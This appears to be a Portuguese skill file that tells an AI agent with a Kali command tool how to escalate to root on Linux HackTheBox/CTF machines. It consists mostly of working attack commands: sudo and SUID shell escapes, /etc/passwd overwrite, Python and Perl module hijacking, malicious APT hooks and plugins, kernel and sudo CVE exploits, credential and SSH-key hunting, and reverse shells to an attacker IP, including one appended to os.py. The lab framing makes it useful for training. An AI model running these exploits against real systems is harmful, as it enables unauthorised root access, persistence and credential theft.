---
name: htb-privesc-linux
description: Use esta skill quando o usuário tiver um shell de baixo privilégio em Linux de HackTheBox/CTF e precisar escalar para root, mencionando "privesc linux", "escalar privilégios", "root", "sudo", "SUID", "cron", "capabilities", "PATH manipulation", "linpeas", "GTFObins", "python module hijacking", "PYTHONPATH", "needrestart", "dstat", "Ansible", "APT hooks", "cgroups", "GameOverlay", "bytecode poisoning", "Perl hijacking", ou quiser ir de usuário comum para root.
argument-hint: [ip-alvo]
allowed-tools: [mcp__mcp-kali-server__execute_command]
---

# HTB PrivEsc Linux — Linux Privilege Escalation

Baseado em +200 write-ups do 0xdf (https://0xdf.gitlab.io/) cobrindo 2018-2026.

## Passo 0 — Contexto inicial

```bash
id && whoami && hostname
uname -a           # versão do kernel → CVEs
cat /etc/os-release
cat /etc/passwd | grep -v 'nologin\|false' | cut -d: -f1,6,7
env | grep -iE 'pass|key|secret|token|api'
ps aux | grep root
ss -tlnp; netstat -tlnp 2>/dev/null
```

## Passo 1 — LinPEAS (enumeração automática)

Servir e executar via HTTP:
```bash
# No Kali:
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh
python3 -m http.server 8888 -d /tmp/

# No alvo:
curl http://<KALI_IP>:8888/linpeas.sh | bash 2>/dev/null | tee /tmp/lpe.txt
```

Focar nos outputs marcados `[+]` e `[!!]`.

## Passo 2 — Sudo

```bash
sudo -l
```

Verificar no **GTFObins** (https://gtfobins.github.io/) cada binário listado.

**Mais comuns no HTB:**
```bash
sudo vim      → :!/bin/bash ou :set shell=/bin/bash | :shell
sudo vi       → :!/bin/bash
sudo nano     → Ctrl+R Ctrl+X (Execute command)
sudo less     → !bash
sudo find     → sudo find /. -exec /bin/bash \;
sudo awk      → sudo awk 'BEGIN {system("/bin/bash")}'
sudo python3  → sudo python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo ruby     → sudo ruby -e 'exec "/bin/bash"'
sudo perl     → sudo perl -e 'exec "/bin/bash"'
sudo env      → sudo env /bin/bash
sudo tar      → sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo zip      → sudo zip /tmp/0xdf.zip /tmp/0xdf -T --unzip-command='sh -c /bin/bash'
sudo nmap     → sudo nmap --interactive → !sh
sudo knife    → sudo knife data bag create x y -e vim → :!/bin/bash  (HTB Knife)

# SSH ProxyCommand (HTB CozyHosting)
sudo ssh -o ProxyCommand='sh 0<&2 1>&2' x
```

### Sudo com SETENV e PYTHONPATH (HTB Admirer):
```bash
# Se sudo tem: (root) SETENV: /opt/scripts/admin_tasks.sh
# Criar biblioteca Python maliciosa:
mkdir /tmp/hijack
cat > /tmp/hijack/shutil.py << 'EOF'
import os
def make_archive(a, b, c):
    os.system("chmod u+s /bin/bash")
EOF
sudo PYTHONPATH=/tmp/hijack /opt/scripts/admin_tasks.sh 6
/bin/bash -p
```

### Sudo com parâmetro injetável:
```bash
# Se sudo permite: sudo -u <user> /bin/bash
# Injetar: sudo -u root -u root /bin/bash

# Se sudo /usr/bin/find /home/* → abusar -exec
sudo find /home/user -exec /bin/bash \;

# CVE-2019-14287 — sudo < 1.8.28
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
```

## Passo 3 — SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

Verificar cada resultado no GTFObins com filtro `suid`.

```bash
/bin/bash -p  # -p preserva UID

# cp SUID → sobrescrever /etc/passwd
openssl passwd -1 -salt xyz "password123"  # gerar hash
echo 'root2:HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd
su root2

# python/perl/ruby SUID
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### PATH Hijacking com binário SUID:
```bash
# Se binário SUID chama comando sem path absoluto (verificar com strings)
strings /opt/suid_binary | grep -Ev '^/'

# Criar binário malicioso no PATH
echo '#!/bin/bash' > /tmp/service
echo 'chmod u+s /bin/bash' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/opt/suid_binary

# HTB Writeup — staff group tem /usr/local/bin no PATH do root
ls -la /usr/local/bin/run-parts  # writable?
echo '#!/bin/bash' > /usr/local/bin/run-parts
echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts
# Aguardar próximo SSH login (update-motd.d executa run-parts como root)
```

## Passo 4 — Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.* 2>/dev/null
crontab -l

# pspy — detectar processos sem root
./pspy64
```

**Vetores:**
```bash
# Script world-writable
ls -la /opt/cron_script.sh
echo "bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1" >> /opt/cron_script.sh

# PATH relativo: cron sem PATH absoluto e diretório writable no PATH
# Criar binário falso que executa antes do real

# Wildcard injection (tar, chown)
# Se cron faz: tar czf /backup/home.tar.gz /home/user/*
echo "bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1" > /home/user/shell.sh
touch '/home/user/--checkpoint=1'
touch '/home/user/--checkpoint-action=exec=bash shell.sh'

# Append a script Python importado por cron de root (HTB FriendZone)
find / -writable -name "*.py" 2>/dev/null | grep -E "lib|module"
# Adicionar ao final de /usr/lib/python2.7/os.py:
echo 'import socket,pty,os;s=socket.socket();s.connect(("<KALI>",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")' >> /usr/lib/python2.7/os.py
```

## Passo 5 — Capabilities

```bash
getcap -r / 2>/dev/null
```

| Capability | Exploit |
|-----------|---------|
| `cap_setuid+eip` | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_net_raw+eip` | sniffing de pacotes |
| `cap_dac_read_search` | `cat /etc/shadow` |
| `cap_fowner+eip` | `chmod 4755 /bin/bash` |
| Binário openssl `=ep` | `./openssl base64 -in /root/root.txt \| base64 -d` (HTB Lightweight) |

## Passo 6 — Python/Perl Module Hijacking

### Python __pycache__ poisoning (HTB Browsed, HTB FriendZone):
```bash
# Encontrar __pycache__ world-writable em módulos usados por scripts root
find / -name "__pycache__" -writable 2>/dev/null

# Identificar qual script root importa o módulo
ps aux | grep root  # ver scripts em execução
cat /opt/root_script.py | grep import

# Gerar .pyc malicioso (Python 3.10)
python3 << 'EOF'
import marshal, struct, time, importlib
code = compile('import os; os.system("chmod u+s /bin/bash")', 'lib.py', 'exec')
magic = importlib.util.MAGIC_NUMBER
with open('/path/to/__pycache__/lib.cpython-310.pyc', 'wb') as f:
    f.write(magic)
    f.write(struct.pack('<I', 0))
    f.write(struct.pack('<Q', int(time.time())))
    f.write(struct.pack('<I', 0))
    f.write(marshal.dumps(code))
EOF
```

### Perl @INC hijacking (HTB Lightweight):
```bash
# Encontrar diretório no @INC que não existe mas é criável
perl -e 'print join("\n", @INC)'
# Se /usr/local/lib/x86_64-linux-gnu/perl/5.XX não existe e é criável:
mkdir -p /usr/local/lib/x86_64-linux-gnu/perl/5.24.1
cp /usr/share/perl5/strict.pm /usr/local/lib/x86_64-linux-gnu/perl/5.24.1/
# Adicionar payload ao início do strict.pm:
sed -i '1i use POSIX qw(setuid);\nBEGIN { setuid(0); system("/bin/bash -p"); }' \
  /usr/local/lib/x86_64-linux-gnu/perl/5.24.1/strict.pm
```

## Passo 7 — needrestart e ferramentas de sistema

### CVE-2024-48990 — needrestart PYTHONPATH injection (HTB Conversor):
```bash
# needrestart < 3.8 — roda como root e usa PYTHONPATH controlável
# Criar módulo malicioso chamado importlib
cat > /tmp/importlib.py << 'EOF'
import os
os.system("chmod u+s /bin/bash")
EOF
PYTHONPATH=/tmp needrestart
/bin/bash -p
```

### needrestart via Perl config injection:
```bash
# Criar arquivo de configuração malicioso
cat > /tmp/needrestart_evil.conf << 'EOF'
$nrconf{uifce} = 'NeedRestart::UI::Debconf';
$nrconf{restart_hook} = sub { exec "/bin/bash" };
EOF
NEEDRESTART_CONF=/tmp/needrestart_evil.conf needrestart
```

### dstat plugin (HTB Soccer):
```bash
# dstat carrega plugins de /usr/local/share/dstat/
ls -la /usr/local/share/dstat/  # writable?

cat > /usr/local/share/dstat/dstat_evil.py << 'EOF'
import os
os.system("chmod u+s /bin/bash")
EOF
dstat --evil
/bin/bash -p
```

### APT hooks (HTB Writer):
```bash
# Se tiver write em /etc/apt/apt.conf.d/ e apt roda como root via cron
cat > /etc/apt/apt.conf.d/99evil << 'EOF'
APT::Update::Pre-Invoke {"chmod u+s /bin/bash"};
EOF
# Aguardar apt-get update do cron
```

## Passo 8 — Ansible playbooks

```bash
# HTB Seal — se ansible synchronize tem copy_links=yes
# Criar symlink apontando para arquivo sensível antes do sync
ln -s /etc/shadow /home/user/shadowlink
# O sync copia o shadow como se fosse arquivo normal

# Se pode escrever em playbook executado como root:
cat > /opt/playbooks/evil.yml << 'EOF'
- hosts: localhost
  tasks:
    - name: privesc
      shell: chmod u+s /bin/bash
      become: yes
EOF
```

## Passo 9 — CVEs de kernel e serviços

```bash
uname -a
dpkg -l | grep -E 'sudo|snapd|polkit|needrestart'
```

| CVE | Afeta | Exploit |
|-----|-------|---------|
| CVE-2023-2640 + CVE-2023-32629 | Ubuntu 22.04 GameOver(lay) | Ver abaixo |
| CVE-2023-35001 | Linux Netfilter | exploit Go |
| CVE-2021-4034 | polkit PwnKit (qualquer distro) | `gcc pwnkit.c -o pwnkit && ./pwnkit` |
| CVE-2022-0847 | Linux kernel 5.8-5.16.11 DirtyPipe | `./dirtypipe /etc/passwd` |
| CVE-2021-3156 | sudo < 1.9.5p2 Baron Samedit | `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` |
| CVE-2019-14287 | sudo < 1.8.28 | `sudo -u#-1 /bin/bash` |
| CVE-2024-48990 | needrestart < 3.8 | PYTHONPATH injection |
| CVE-2019-7304 | snap dirty_sock | script Python |

### GameOver(lay) — CVE-2023-2640 / CVE-2023-32629 (HTB Hospital):
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;
mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &&
touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'
```

### SHA512crypt hash cracking (HTB Hospital):
```bash
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
# Formato: $6$salt$hash
```

## Passo 10 — Informações sensíveis

```bash
# Histórico
cat ~/.bash_history ~/.zsh_history 2>/dev/null

# Credenciais em arquivos
grep -r "password\|passwd\|secret\|key\|token" /home /var/www /opt 2>/dev/null \
  | grep -v ".pyc\|Binary" | head -50

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null | xargs grep -l "PRIVATE" 2>/dev/null

# Databases locais
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null | head -10

# LDAP plaintext (HTB Lightweight) — capturar com tcpdump
sudo tcpdump -i lo -nnXs 0 'port 389' &
# Aguardar autenticação LDAP automática
```

## Passo 11 — NFS sem root_squash

```bash
showmount -e <TARGET_IP>
# Se houver share sem root_squash:
mount -t nfs <TARGET_IP>:/home /mnt/nfs
# Criar usuário local com mesmo UID do usuário remoto
useradd -u 1000 hijack
su hijack
cat /mnt/nfs/user/.ssh/id_rsa
```

## Checklist de PrivEsc Linux

```
[ ] sudo -l → GTFObins, SETENV + PYTHONPATH, argumento injetável
[ ] find / -perm -4000 2>/dev/null → SUID → GTFObins
[ ] getcap -r / 2>/dev/null → cap_setuid, cap_fowner
[ ] crontab -l; cat /etc/crontab → wildcard injection, script writable
[ ] find / -writable -name "*.py" 2>/dev/null → módulos de root
[ ] find / -name "__pycache__" -writable 2>/dev/null
[ ] /usr/local/share/dstat/ writable? → plugin malicioso
[ ] /etc/apt/apt.conf.d/ writable? → APT hook
[ ] uname -a → GameOverlay, DirtyPipe, PwnKit
[ ] dpkg -l sudo → CVE-2019-14287 se < 1.8.28, CVE-2021-3156 se < 1.9.5p2
[ ] dpkg -l needrestart → CVE-2024-48990 se < 3.8
[ ] showmount -e target → NFS sem root_squash
[ ] cat ~/.bash_history → credenciais
[ ] grep -r password /var/www /opt 2>/dev/null
```
